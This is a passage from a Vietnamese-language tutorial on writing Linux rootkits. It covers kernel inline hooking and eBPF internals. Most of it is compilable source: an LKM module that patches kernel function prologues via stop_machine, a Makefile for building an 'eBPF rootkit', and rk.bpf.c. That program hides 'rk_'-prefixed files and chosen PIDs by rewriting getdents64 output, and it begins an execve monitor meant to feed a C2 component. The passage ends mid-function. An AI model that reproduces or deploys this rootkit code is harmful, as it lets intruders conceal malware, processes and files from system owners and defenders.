                            1. Lam viec cua rootkit
                            2. (optional) call trampoline
                               │
                               ▼
                          trampoline:
                            1. Execute 12 bytes original
                               (push rbp, mov rbp rsp, sub rsp, mov)
                            2. JMP target_func + 12
                               │
                               ▼
                          target_func + 12:
                            (tiep tuc original function tu byte 13)
                            → return binh thuong ve caller


  QUAN TRONG: Trampoline PHAI nam trong EXECUTABLE memory.
  ───────────────────────────────────────────────────────
  kmalloc() → data pages (NX bit set) → CPU refuse execute → crash
  module_alloc() → module code pages (executable) → OK
  
  Tren kernel co SMEP (Supervisor Mode Execution Prevention):
  Kernel KHONG the execute code o user pages.
  Tren kernel co NX (No-Execute):
  CPU KHONG the execute code o pages marked non-executable.
  → PHAI dung module_alloc() hoac vmalloc_exec() de co executable memory.
```

**Tham khao source:** `arch/x86/kernel/alternative.c` (text_poke, text_poke_bp), `include/linux/stop_machine.h`, `kernel/module/main.c` (module_alloc), `arch/x86/include/asm/text-patching.h`

---

```c
/* inline_hook.c — Inline function hooking (code patching)
 *
 * Concept: THAY DOI BYTES DAU TIEN cua target function
 * bang JMP instruction toi hook function.
 *
 * Day la ky thuat dung trong:
 * - Game hacking (Detours library tren Windows)
 * - Anti-virus hooking
 * - Rootkit khi khong the dung syscall table / ftrace
 *
 * Tai sao inline hook khi da co ftrace:
 *   1. Ftrace co the bi disabled (CONFIG_FTRACE=n)
 *   2. Ftrace hook visible trong debugfs
 *   3. Inline hook kho detect hon (code modification o level byte)
 *   4. Hoat dong tren bat ky kernel function, ke ca non-traceable
 *
 * CACH HOAT DONG:
 *
 * Original function:
 *   target_func:
 *     55                  push rbp
 *     48 89 e5            mov rbp, rsp
 *     48 83 ec 20         sub rsp, 0x20
 *     ...
 *
 * After inline hook:
 *   target_func:
 *     48 b8 xx xx xx xx   mov rax, hook_func_addr   (10 bytes)
 *     xx xx xx xx
 *     ff e0               jmp rax                    (2 bytes)
 *                                                    Total: 12 bytes
 *
 * Trampoline (de goi original function):
 *   trampoline:
 *     55                  push rbp          }  saved original
 *     48 89 e5            mov rbp, rsp      }  bytes (12 bytes)
 *     48 83 ec 20         sub rsp, 0x20     }  
 *     48 b8 yy yy yy yy   mov rax, target_func+12
 *     yy yy yy yy
 *     ff e0               jmp rax    → continue original after patch point
 *
 * Khi hook active:
 *   caller → target_func → JMP hook_func
 *                            hook_func: do stuff
 *                            hook_func: call trampoline (= original)
 *                            trampoline: execute saved bytes
 *                            trampoline: JMP target_func+12
 *                            target_func continues normally
 */

#include "rootkit.h"
#include <asm/text-patching.h>  /* text_poke neu available */
#include <linux/stop_machine.h> /* stop_machine cho SMP-safe patching */

#define HOOK_SIZE 12  /* mov rax, imm64 (10) + jmp rax (2) */

struct inline_hook {
    const char *name;        /* Target function name */
    void *target;            /* Resolved address */
    void *hook_fn;           /* Our hook function */
    unsigned char orig_bytes[HOOK_SIZE];  /* Saved original bytes */
    unsigned char *trampoline;            /* Executable trampoline */
    bool active;
};

/*
 * Allocate executable memory cho trampoline.
 *
 * Trampoline can:
 * 1. Chua original bytes (12 bytes)
 * 2. Chua jump back instruction (12 bytes)
 * 3. Nam trong EXECUTABLE memory
 *
 * module_alloc(): allocate memory trong module address range.
 * Memory nay executable (khac kmalloc — data memory, non-exec).
 *
 * Tai sao module_alloc: vi SMEP, NX — khong the execute data pages.
 * module_alloc tra ve memory trong module code range = executable.
 */
static int create_trampoline(struct inline_hook *hook)
{
    unsigned char jmp_back[HOOK_SIZE];

    /* Allocate executable memory.
     * HOOK_SIZE * 2 = original bytes + jump back = 24 bytes.
     * module_alloc rounds up to page size internally. */
    hook->trampoline = module_alloc(HOOK_SIZE * 2);
    if (!hook->trampoline)
        return -ENOMEM;

    /* Copy original bytes vao trampoline */
    memcpy(hook->trampoline, hook->orig_bytes, HOOK_SIZE);

    /* Build jump-back instruction:
     *   mov rax, (target + HOOK_SIZE)
     *   jmp rax
     * → Sau khi execute saved bytes, jump toi instruction #13
     *   trong original function (tiep tuc binh thuong) */
    jmp_back[0] = 0x48;  /* REX.W prefix */
    jmp_back[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_back + 2) =
        (unsigned long)hook->target + HOOK_SIZE;
    jmp_back[10] = 0xff;  /* jmp */
    jmp_back[11] = 0xe0;  /* rax */

    memcpy(hook->trampoline + HOOK_SIZE, jmp_back, HOOK_SIZE);

    /* Set trampoline pages executable.
     * module_alloc memory should already be executable,
     * but ensure it explicitly. */
    set_memory_x((unsigned long)hook->trampoline, 1);

    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * SMP-SAFE CODE PATCHING via stop_machine()
 *
 * Van de SMP:
 *   CPU khac co the dang execute target function CUNG LUC
 *   ta dang overwrite bytes. Neu CPU thay nua instruction
 *   cu + nua instruction moi = undefined behavior / crash.
 *
 *   local_irq_save + preempt_disable chi disable interrupts
 *   tren CURRENT CPU. Cac CPU khac van execute code binh thuong.
 *
 * Giai phap: stop_machine()
 *   1. Send IPI toi moi CPU: "stop and spin"
 *   2. Moi CPU enter idle spin loop
 *   3. Patch function chay tren calling CPU (chi 1 CPU hoat dong)
 *   4. Patch function return → tat ca CPUs resume
 *
 *   Guarantee: KHONG CPU nao execute code bi patch khi dang patch.
 *
 * Alternative kernel API: text_poke_bp()
 *   Dung INT3 (breakpoint) approach:
 *   1. Ghi INT3 (1 byte) tai byte dau → atomic single-byte write
 *   2. Sync tat ca CPUs (IPI)
 *   3. Ghi remaining bytes (sau INT3)
 *   4. Replace INT3 bang byte dau cua new code
 *   5. Sync tat ca CPUs
 *   Nhung text_poke_bp co the unexported → dung stop_machine.
 * ══════════════════════════════════════════════════════════════ */

struct patch_data {
    void *target;
    void *patch;
    int   size;
};

static int do_patch(void *data)
{
    struct patch_data *pd = data;

    /* Tai thoi diem nay, TAT CA CPUs da stop.
     * Chi CPU chay function nay hoat dong.
     * An toan de modify code. */
    rk_unprotect_memory();
    memcpy(pd->target, pd->patch, pd->size);
    rk_protect_memory();

    /* Flush instruction caches tren CPU nay.
     * Cac CPU khac flush khi resume. */
    sync_core();

    return 0;
}

/*
 * Install inline hook — patch target function prologue.
 *
 * Dung stop_machine() de dam bao SMP safety:
 * stop tat ca CPUs → patch code → resume tat ca CPUs.
 */
static int install_inline_hook(struct inline_hook *hook)
{
    unsigned char jmp_code[HOOK_SIZE];
    struct patch_data pd;
    int err;

    /* Resolve target address */
    hook->target = (void *)rk_lookup_name(hook->name);
    if (!hook->target) {
        pr_err("rk: inline hook cannot resolve %s\n", hook->name);
        return -ENOENT;
    }

    /* Save original bytes TRUOC KHI patch */
    memcpy(hook->orig_bytes, hook->target, HOOK_SIZE);

    /* Create trampoline */
    err = create_trampoline(hook);
    if (err)
        return err;

    /* Build jump-to-hook instruction */
    jmp_code[0] = 0x48;  /* REX.W */
    jmp_code[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_code + 2) = (unsigned long)hook->hook_fn;
    jmp_code[10] = 0xff;  /* jmp rax */
    jmp_code[11] = 0xe0;

    /* Patch target function via stop_machine.
     *
     * stop_machine(fn, data, NULL):
     *   1. Send IPI toi moi CPU: "stop and spin"
     *   2. Moi CPU enter idle spin loop
     *   3. fn(data) chay tren calling CPU (chi 1 CPU hoat dong)
     *   4. fn return → tat ca CPUs resume
     *
     * Guarantee: KHONG CPU nao execute code bi patch khi dang patch. */
    pd.target = hook->target;
    pd.patch  = jmp_code;
    pd.size   = HOOK_SIZE;

    err = stop_machine(do_patch, &pd, NULL);
    if (err)
        return err;

    hook->active = true;
    pr_info("rk: inline hook installed on %s @ %px\n",
            hook->name, hook->target);
    return 0;
}

static void remove_inline_hook(struct inline_hook *hook)
{
    struct patch_data pd;

    if (!hook->active)
        return;

    /* Restore original bytes via stop_machine — SMP-safe */
    pd.target = hook->target;
    pd.patch  = hook->orig_bytes;
    pd.size   = HOOK_SIZE;

    stop_machine(do_patch, &pd, NULL);

    /* Free trampoline */
    if (hook->trampoline) {
        module_free(THIS_MODULE, hook->trampoline);
        hook->trampoline = NULL;
    }

    hook->active = false;
    pr_info("rk: inline hook removed from %s\n", hook->name);
}
```

---
## Chapter 10: eBPF Rootkit — The he moi

### 10.0 eBPF Architecture — Virtual machine trong kernel

eBPF (extended Berkeley Packet Filter) la mot virtual machine chay trong kernel space, cho phep userspace programs inject code vao kernel ma khong can viet kernel module. Hieu kien truc nay la nen tang de hieu tai sao eBPF rootkit nguy hiem va kho detect hon LKM rootkit truyen thong.

#### 10.0.1 eBPF Virtual Machine — Register set va instruction format

eBPF VM la mot register-based virtual machine (khong phai stack-based nhu JVM). Thiet ke nay cho phep map truc tiep sang CPU registers khi JIT compile, dat hieu nang gan native code.

```
eBPF Register Set (11 registers, 64-bit moi register):
+==========+============================================+==============+
| Register | Chuc nang                                  | Luu y        |
+==========+============================================+==============+
| r0       | Return value tu BPF program va helpers     | Caller-saved |
| r1       | Argument 1 (context pointer khi program    | Caller-saved |
|          | start, helper arg1 khi goi helper)         |              |
| r2       | Argument 2                                 | Caller-saved |
| r3       | Argument 3                                 | Caller-saved |
| r4       | Argument 4                                 | Caller-saved |
| r5       | Argument 5                                 | Caller-saved |
| r6       | General purpose                            | Callee-saved |
| r7       | General purpose                            | Callee-saved |
| r8       | General purpose                            | Callee-saved |
| r9       | General purpose                            | Callee-saved |
| r10      | Frame pointer (read-only, tro toi stack)   | Read-only    |
+==========+============================================+==============+

Stack: 512 bytes per program (co dinh, khong grow duoc)
```

Moi eBPF instruction co do rong 64-bit voi encoding nhu sau:

```
eBPF Instruction Format (64-bit wide):
  ┌─────────┬──────┬──────┬────────┬──────────────────────────┐
  │  opcode │ dst  │ src  │ offset │       immediate          │
  │  8 bit  │ 4bit │ 4bit │ 16 bit │        32 bit            │
  └─────────┴──────┴──────┴────────┴──────────────────────────┘
  Byte:  0      1 (lo/hi)      2-3          4-7

  opcode = instruction class (3bit) + source (1bit) + operation (4bit)
  
  Classes:
    BPF_LD    = 0x00   Load tu immediate/packet
    BPF_LDX   = 0x01   Load tu memory
    BPF_ST    = 0x02   Store immediate
    BPF_STX   = 0x03   Store register
    BPF_ALU   = 0x04   32-bit ALU operations
    BPF_JMP   = 0x05   64-bit jumps
    BPF_JMP32 = 0x06   32-bit jumps
    BPF_ALU64 = 0x07   64-bit ALU operations
```

Calling convention khi goi BPF helper function:

```
  BPF program                          BPF Helper
  ┌──────────────┐                    ┌──────────────────┐
  │ r1 = arg1    │───────────────────>│ long helper_fn(  │
  │ r2 = arg2    │───────────────────>│   u64 r1,        │
  │ r3 = arg3    │───────────────────>│   u64 r2,        │
  │ r4 = arg4    │───────────────────>│   u64 r3,        │
  │ r5 = arg5    │───────────────────>│   u64 r4,        │
  │              │                    │   u64 r5)         │
  │ r0 = retval  │<───────────────────│ return value;     │
  └──────────────┘                    └──────────────────┘
  r1-r5: caller-saved (bi destroy sau helper call)
  r6-r9: callee-saved (helper phai preserve)
  r10:   frame pointer, khong doi
```

#### 10.0.2 BPF Program Lifecycle — Tu source code toi kernel execution

```
 User writes .bpf.c
        │
        ▼
 Clang compiles to BPF ELF (-target bpf)
        │
        ▼
 bpftool gen skeleton → .skel.h (auto-generated loader)
        │
        ▼
 Userspace loader links with libbpf
        │
        ▼
 bpf(BPF_PROG_LOAD, ...) syscall
        │
        ▼
 ┌──────────────────────────────────────────────────┐
 │              VERIFIER (kernel/bpf/verifier.c)    │
 │                                                  │
 │  1. CFG Analysis:                                │
 │     - Build control flow graph                   │
 │     - Detect unreachable code                    │
 │     - ALL paths MUST reach BPF_EXIT              │
 │                                                  │
 │  2. Loop Detection:                              │
 │     - No unbounded loops (phai provably finite)  │
 │     - Bounded loops OK since kernel 5.3          │
 │     - Back-edges phai co bound proof             │
 │                                                  │
 │  3. Memory Safety:                               │
 │     - ALL memory accesses within bounds           │
 │     - Pointer arithmetic tracked per-register    │
 │     - NULL checks enforced before dereference    │
 │     - Stack access: r10 + offset (offset < 0)    │
 │                                                  │
 │  4. Helper Validation:                           │
 │     - Only whitelisted helper functions           │
 │     - Argument types match expected              │
 │     - Return value type propagated               │
 │                                                  │
 │  5. Resource Limits:                             │
 │     - Stack depth <= 512 bytes                   │
 │     - Program size <= 1M instructions (was 4096  │
 │       before kernel 5.2)                         │
 │     - Max 33 tail calls (MAX_TAIL_CALL_CNT)
 │     - Max 8 BPF-to-BPF function call depth
 │       (MAX_CALL_FRAMES — khac voi tail calls)                     │
 │     - Complexity limit (verified instructions)   │
 │                                                  │
 │  Result: ACCEPT → proceed to JIT                 │
 │          REJECT → bpf() returns -EINVAL + log    │
 └──────────────────────┬───────────────────────────┘
                        │ ACCEPT
                        ▼
 ┌──────────────────────────────────────────────────┐
 │           JIT Compiler (arch/x86/net/bpf_jit*)   │
 │                                                  │
 │  BPF bytecode ──→ native x86_64 instructions    │
 │                                                  │
 │  BPF r0-r9 mapped to CPU registers:             │
 │    r0 → RAX    r6 → RBX                         │
 │    r1 → RDI    r7 → R13                         │
 │    r2 → RSI    r8 → R14                         │
 │    r3 → RDX    r9 → R15                         │
 │    r4 → RCX    r10→ RBP                         │
 │    r5 → R8                                       │
 │                                                  │
 │  JIT output: executable memory page              │
 │  (CONFIG_BPF_JIT=y, default on modern kernels)   │
 └──────────────────────┬───────────────────────────┘
                        │
                        ▼
 Attach to hook point (kprobe, tracepoint, XDP, etc.)
        │
        ▼
 Program executes in kernel context khi hook fires
```

#### 10.0.3 BPF Map Types — Shared data structures

BPF maps la cau truc du lieu dung chung giua BPF programs (kernel space) va userspace. Maps persist across program invocations va duoc share thong qua file descriptor.

```
Map Type                    Mo ta                                 Use case rootkit
─────────────────────────────────────────────────────────────────────────────────────
BPF_MAP_TYPE_HASH           Key-value hash table, dynamic size    Luu hidden PIDs,
                            O(1) lookup/insert/delete             config values

BPF_MAP_TYPE_ARRAY          Fixed-size array, index = key         Global counters,
                            O(1) access, pre-allocated            stats, state flags

BPF_MAP_TYPE_RINGBUF        Lock-free ring buffer, kernel→user    Event streaming
                            Variable-size records, single reader  kernel → userspace

BPF_MAP_TYPE_PERF_EVENT     Per-CPU ring buffer (older API)       Legacy event output
                            Fixed-size records, per-CPU           (prefer RINGBUF)

BPF_MAP_TYPE_LRU_HASH       Hash with LRU eviction                Connection tracking
                            Auto-evict oldest khi full            voi bounded memory

BPF_MAP_TYPE_PERCPU_HASH    Per-CPU hash (no locking needed)      High-perf counters
BPF_MAP_TYPE_PERCPU_ARRAY   Per-CPU array (no locking needed)     Per-CPU state


Map lifecycle:
  ┌─────────────┐     bpf(BPF_MAP_CREATE)     ┌──────────────┐
  │  Userspace   │ ──────────────────────────> │  Kernel map  │
  │  (fd-based   │ <────── fd returned ─────── │  (in kernel  │
  │   access)    │                             │   memory)    │
  └──────┬───────┘                             └──────┬───────┘
         │                                            │
         │  bpf(BPF_MAP_LOOKUP/UPDATE/DELETE)         │  bpf_map_lookup_elem()
         │  (userspace side via fd)                   │  bpf_map_update_elem()
         │                                            │  (BPF program side)
         │                                            │
         └──── Pin to /sys/fs/bpf/ ──→ PERSIST ───────┘
               (survive process exit)
```

#### 10.0.4 BPF Program Types — Hook points cho rootkit

```
Program type (SEC macro)     Hook point                 Rootkit application
────────────────────────────────────────────────────────────────────────────
SEC("kprobe/func")           Function entry via INT3    Hook bat ky kernel function
                             breakpoint                 (getdents, tcp4_seq_show)

SEC("kretprobe/func")        Function return            Modify return values,
                             via trampoline             filter output data

SEC("fentry/func")           Function entry via ftrace  Nhu kprobe nhung NHANH hon
                             (kernel 5.5+, no INT3)    (khong dung breakpoint)

SEC("fexit/func")            Function return via ftrace Nhu kretprobe nhung co
                             (kernel 5.5+)             access ca input args

SEC("tracepoint/cat/name")   Static kernel tracepoints  Hook syscall enter/exit
                             (stable ABI)              (sys_enter_getdents64)

SEC("xdp")                   eXpress Data Path          Packet filtering TRUOC
                             NIC driver level           netfilter/tcpdump

SEC("tc")                    Traffic control hook       Packet modify o TC layer
                             (ingress/egress)           (sau XDP, truoc socket)

SEC("raw_tracepoint/name")   Raw tracepoint             Lower overhead,
                             (no argument processing)   raw access to args


fentry/fexit vs kprobe/kretprobe:
  ┌─────────────────────────────────────────────────────────────┐
  │ kprobe: Dung INT3 breakpoint → trap → handler → resume     │
  │   Overhead: ~100-200ns per call (INT3 + trap handling)     │
  │   Compat: Kernel 4.1+                                      │
  │                                                             │
  │ fentry: Dung ftrace NOP patching → direct call → return    │
  │   Overhead: ~10-30ns per call (direct function call)       │
  │   Compat: Kernel 5.5+ (requires BTF)                       │
  │   Bonus: fexit co access ca input arguments                │
  └─────────────────────────────────────────────────────────────┘
```

#### 10.0.5 BTF va CO-RE (Compile Once, Run Everywhere)

Truoc BTF/CO-RE, eBPF programs phai compile tren CHINH XAC kernel version target (vi struct layout thay doi giua versions). BTF giai quyet van de nay:

```
Van de cu (khong co CO-RE):
  ┌──────────────────┐     ┌──────────────────┐
  │ Kernel 5.15      │     │ Kernel 6.1       │
  │ struct task_struct│     │ struct task_struct│
  │   ...            │     │   ...            │
  │   pid @ offset   │     │   pid @ offset   │
  │   280             │     │   296 (KHAC!)    │
  │   ...            │     │   ...            │
  └──────────────────┘     └──────────────────┘
  BPF program hardcode offset 280 → CRASH tren 6.1!

Giai phap: BTF + CO-RE
  ┌────────────────────────────────────────────────────────┐
  │ CONFIG_DEBUG_INFO_BTF=y (default tren modern distros) │
  │                                                        │
  │ BTF = compact type information embedded in kernel      │
  │ Location: /sys/kernel/btf/vmlinux                      │
  │                                                        │
  │ bpftool btf dump file /sys/kernel/btf/vmlinux format c │
  │ → generates vmlinux.h (ALL kernel struct definitions)  │
  └────────────────────────────────────────────────────────┘

  CO-RE Flow:
  ┌───────────────┐    ┌──────────────┐    ┌───────────────┐
  │ .bpf.c source │    │ Clang + BTF  │    │ BPF ELF with  │
  │ uses          │───>│ compile with │───>│ CO-RE relocs  │
  │ BPF_CORE_READ │    │ -g flag      │    │ (field offset │
  │               │    │              │    │  relocations) │
  └───────────────┘    └──────────────┘    └───────┬───────┘
                                                   │
                                           load time (libbpf)
                                                   │
                                                   ▼
                                    ┌──────────────────────────┐
                                    │ libbpf reads target      │
                                    │ kernel BTF, patches      │
                                    │ field offsets in BPF      │
                                    │ instructions              │
                                    │                          │
                                    │ offset 280 → patched     │
                                    │ to 296 on kernel 6.1     │
                                    └──────────────────────────┘

  Ket qua: Code compiled tren kernel 5.15 chay duoc tren 6.1
           ma KHONG can recompile!
```

#### 10.0.6 bpf_override_return — Overwrite function return value

```
bpf_override_return(struct pt_regs *regs, u64 rc):

  Yeu cau BAT BUOC (thieu mot cai = KHONG HOAT DONG):
  ┌────────────────────────────────────────────────────────┐
  │ 1. CONFIG_BPF_KPROBE_OVERRIDE=y trong kernel config   │
  │ 2. Target function annotated voi ALLOW_ERROR_INJECTION│
  │ 3. Program type = kprobe (KHONG phai fentry/fexit)    │
  │ 4. Chi hoat dong voi functions return long/int        │
  └────────────────────────────────────────────────────────┘

  Cach hoat dong:
  ┌─────────────────────────────────────────────────────┐
  │ 1. kprobe fires tai function entry                  │
  │ 2. BPF program goi bpf_override_return(regs, val)  │
  │ 3. Kernel set pt_regs->ax = val (return value)      │
  │ 4. Kernel set pt_regs->ip = just past function      │
  │    prologue (skip function body entirely)           │
  │ 5. Function NEVER EXECUTES — returns val directly   │
  └─────────────────────────────────────────────────────┘

  Rootkit use: kprobe tcp4_seq_show → bpf_override_return(ctx, 1)
               1 = SEQ_SKIP → connection entry khong duoc output
               → Port an trong /proc/net/tcp
```

---

### 10.1 Makefile cho eBPF rootkit

```makefile
# Makefile.ebpf — Build system cho eBPF rootkit
#
# Prerequisites:
#   sudo apt install clang llvm libbpf-dev linux-headers-$(uname -r)
#   sudo apt install linux-tools-common linux-tools-$(uname -r)
#
# Usage:
#   make -f Makefile.ebpf        # Build everything
#   sudo ./rk_loader             # Load eBPF rootkit

CLANG     := clang
LLC       := llc
BPFTOOL   := bpftool
CC        := gcc

# Kernel header paths
KHEADERS  := /usr/src/linux-headers-$(shell uname -r)

# BPF compile flags
BPF_CFLAGS := -target bpf \
              -D__TARGET_ARCH_x86 \
              -O2 -g \
              -Wall \
              -I$(KHEADERS)/include \
              -I$(KHEADERS)/arch/x86/include

# Userspace loader compile flags
LOADER_CFLAGS  := -Wall -O2 -g
LOADER_LDFLAGS := -lbpf -lelf -lz

.PHONY: all clean

all: rk_loader

# Step 1: Generate vmlinux.h from running kernel BTF data
# vmlinux.h chứa type definitions cho MỌI kernel struct
# Thay thế cho hàng trăm kernel headers
vmlinux.h:
	$(BPFTOOL) btf dump file /sys/kernel/btf/vmlinux format c > $@

# Step 2: Compile eBPF program
rk.bpf.o: rk.bpf.c vmlinux.h
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

# Step 3: Generate skeleton header (auto-generated loader code)
rk.skel.h: rk.bpf.o
	$(BPFTOOL) gen skeleton $< > $@

# Step 4: Compile userspace loader
rk_loader: rk_loader.c rk.skel.h
	$(CC) $(LOADER_CFLAGS) -o $@ $< $(LOADER_LDFLAGS)

clean:
	rm -f vmlinux.h rk.bpf.o rk.skel.h rk_loader
```

### 10.2 eBPF kernel programs (rk.bpf.c)

```c
/* rk.bpf.c — eBPF rootkit kernel programs
 *
 * Compile: clang -target bpf -O2 -g -c rk.bpf.c -o rk.bpf.o
 *
 * File này chứa THỰC SỰ compilable eBPF programs.
 * Mỗi SEC() macro định nghĩa một program attach point.
 *
 * eBPF constraints (verifier enforce):
 *   - Stack: max 512 bytes
 *   - No unbounded loops (bounded loops OK since kernel 5.3)
 *   - No arbitrary memory access (must use bpf_probe_read_*)
 *   - No calling arbitrary functions (only BPF helpers)
 *   - Programs must terminate (verifier proves termination)
 *   - Max 1M verified instructions (configurable)
 *
 * eBPF rootkit KHÁC LKM rootkit fundamental:
 *   - Không cần kernel module (không cần insmod, không cần root trên một số config)
 *   - Không xuất hiện trong lsmod (vì không phải module)
 *   - eBPF programs run trong verified sandbox
 *   - Persist qua bpf filesystem pinning
 *   - Legitimate tools (Cilium, Falco) cũng dùng eBPF → khó phân biệt
 *
 * Components:
 *   1. eBPF programs (chạy trong kernel)   → .bpf.c files
 *   2. Userspace loader (load + manage)     → .c file (dùng libbpf)
 *   3. eBPF maps (shared data kernel↔user) → defined trong .bpf.c
 *
 * BUILD SYSTEM:
 *   Cần: clang, llvm, libbpf, bpftool, kernel headers
 *
 *   Makefile:
 *     clang -target bpf -O2 -g -c rootkit.bpf.c -o rootkit.bpf.o
 *     bpftool gen skeleton rootkit.bpf.o > rootkit.skel.h
 *     gcc -o loader loader.c -lbpf -lelf -lz
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define HIDDEN_PREFIX     "rk_"
#define HIDDEN_PREFIX_LEN 3
#define HIDDEN_PORT       4444
#define MAGIC_SIGNAL      54
#define TASK_COMM_LEN     16
#define MAX_ENTRIES       128

char LICENSE[] SEC("license") = "GPL";

/* ══════════════════════════════════════════════════════════════
 * BPF MAPS — Shared data structures
 *
 * Maps = kernel↔userspace shared data structures.
 * Types: hash, array, ringbuf, perf_event_array, etc.
 *
 * Kernel programs write data → userspace reads.
 * Userspace writes config → kernel programs read.
 * ══════════════════════════════════════════════════════════════ */

/* Map: lưu dirent buffer pointer cho syscall exit handler.
 *
 * Key   = pid_tgid (u64): unique per thread
 * Value = buf_info: saved syscall arguments
 *
 * Flow:
 *   sys_enter_getdents64 → save buffer pointer vào map
 *   sys_exit_getdents64  → lookup buffer pointer, modify data
 */
struct buf_info {
    __u64 dirent_buf;    /* Userspace dirent buffer address */
    __u32 fd;            /* File descriptor */
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);           /* pid_tgid */
    __type(value, struct buf_info);
} dirent_map SEC(".maps");

/* Map: PIDs cần ẩn. Userspace loader add/remove PIDs. */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);            /* PID */
    __type(value, __u8);           /* dummy value, existence = hidden */
} hidden_pids SEC(".maps");

/* Map: events ring buffer — kernel gửi events tới userspace */
struct event {
    __u32 pid;
    __u32 uid;
    __u8  type;           /* 1=exec, 2=connect, 3=magic_signal */
    char  comm[TASK_COMM_LEN];
    char  filename[256];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);   /* 256 KB ring buffer */
} events SEC(".maps");

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 1: Getdents64 interception — File/Process hiding
 *
 * Attach: tracepoint/syscalls/sys_enter_getdents64
 *         tracepoint/syscalls/sys_exit_getdents64
 *
 * Strategy:
 *   Enter: save buffer pointer và fd
 *   Exit:  read buffer, find hidden entries, overwrite d_reclen
 *          của entry trước (nuốt hidden entry)
 *
 * Giới hạn eBPF vs LKM:
 *   - bpf_probe_write_user(): CÓ THỂ ghi userspace memory
 *     NHƯNG: verifier flag nó là "unsafe", cần CAP_SYS_ADMIN
 *   - Stack limit 512 bytes → không thể copy toàn bộ buffer
 *   - Phải iterate với bounded loop → max entries limited
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info info;

    /* ctx->args[0] = fd
     * ctx->args[1] = dirent buffer pointer
     * ctx->args[2] = count (buffer size)
     *
     * Tracepoint args access khác kprobe:
     * Tracepoint: args indexed by position
     * Kprobe: PT_REGS_PARM1(ctx), etc. */
    info.fd = (__u32)ctx->args[0];
    info.dirent_buf = (__u64)ctx->args[1];

    bpf_map_update_elem(&dirent_map, &pid_tgid, &info, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct buf_info *info;
    long ret = ctx->ret;

    /* Lookup saved buffer info */
    info = bpf_map_lookup_elem(&dirent_map, &pid_tgid);
    if (!info || ret <= 0)
        goto cleanup;

    /* ── Iterate directory entries ──
     *
     * Bounded loop: eBPF verifier requires provably finite loops.
     * MAX_ENTRIES = max number of iterations.
     * Nếu directory có >MAX_ENTRIES entries → entries cuối không filtered.
     *
     * Mỗi iteration:
     *   1. Read d_reclen và d_name từ userspace
     *   2. Check nếu cần hide
     *   3. Nếu hide: overwrite d_reclen của entry trước
     */
    __u64 offset = 0;
    __u64 prev_offset = 0;
    __u16 prev_reclen = 0;

    for (int i = 0; i < MAX_ENTRIES; i++) {
        if (offset >= (__u64)ret)
            break;

        /* Read d_reclen (2 bytes tại offset+16 trong linux_dirent64)
         *
         * struct linux_dirent64:
         *   offset 0:  d_ino    (8 bytes)
         *   offset 8:  d_off    (8 bytes)
         *   offset 16: d_reclen (2 bytes)  ← ta đọc cái này
         *   offset 18: d_type   (1 byte)
         *   offset 19: d_name[] (variable)
         */
        __u16 d_reclen = 0;
        bpf_probe_read_user(&d_reclen,
                             sizeof(d_reclen),
                             (void *)(info->dirent_buf + offset + 16));
        if (d_reclen == 0)
            break;

        /* Read d_name (max 256 bytes, offset 19) */
        char d_name[256];
        __builtin_memset(d_name, 0, sizeof(d_name));

        __u16 name_len = d_reclen - 19;  /* 19 = header size before d_name */
        if (name_len > 255) name_len = 255;

        bpf_probe_read_user_str(d_name, name_len + 1,
                                 (void *)(info->dirent_buf + offset + 19));

        /* Check hide criteria */
        bool hide = false;

        /* Check filename prefix */
        if (d_name[0] == 'r' && d_name[1] == 'k' && d_name[2] == '_')
            hide = true;

        /* Check hidden PID (numeric name in /proc) */
        if (!hide && d_name[0] >= '0' && d_name[0] <= '9') {
            __u32 pid = 0;
            for (int j = 0; j < 10 && d_name[j] >= '0' && d_name[j] <= '9'; j++)
                pid = pid * 10 + (d_name[j] - '0');

            __u8 *is_hidden = bpf_map_lookup_elem(&hidden_pids, &pid);
            if (is_hidden)
                hide = true;
        }

        /* Perform hiding: expand previous entry's d_reclen */
        if (hide && prev_reclen > 0) {
            __u16 new_reclen = prev_reclen + d_reclen;
            /* bpf_probe_write_user: write vào userspace memory.
             *
             * DANGEROUS helper:
             *   - Verifier flags program as "unsafe"
             *   - Requires CAP_SYS_ADMIN
             *   - Can corrupt userspace data nếu offset sai
             *   - Một số kernel configs restrict/disable nó
             *
             * Ghi d_reclen mới cho entry trước:
             *   prev entry tại (buf + prev_offset + 16) */
            bpf_probe_write_user(
                (void *)(info->dirent_buf + prev_offset + 16),
                &new_reclen,
                sizeof(new_reclen));

            /* Không update prev_offset/prev_reclen — giữ nguyên
             * vì current entry bị "nuốt" vào prev. */
        } else {
            prev_offset = offset;
            prev_reclen = d_reclen;
        }

        offset += d_reclen;
    }

cleanup:
    bpf_map_delete_elem(&dirent_map, &pid_tgid);
    return 0;
}

/* ══════════════════════════════════════════════════════════════
 * PROGRAM 2: Execve monitoring — Log mọi process execution
 *
 * Attach: tracepoint/syscalls/sys_enter_execve
 *
 * Send event tới userspace qua ring buffer.
 * Userspace logger/C2 component nhận và process.
 * ══════════════════════════════════════════════════════════════ */

SEC("tracepoint/syscalls/sys_enter_execve")
int handle_execve(struct trace_event_raw_sys_enter *ctx)
{
    struct event *e;

    /* Reserve space trong ring buffer.
     *
     * bpf_ringbuf_reserve: allocate slot trong ring buffer.
     * Return NULL nếu buffer full (data loss — acceptable).
     * Phải gọi bpf_ringbuf_submit() hoặc bpf_ringbuf_discard(). */
    e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return 0;

    e->type = 1;  /* exec event */
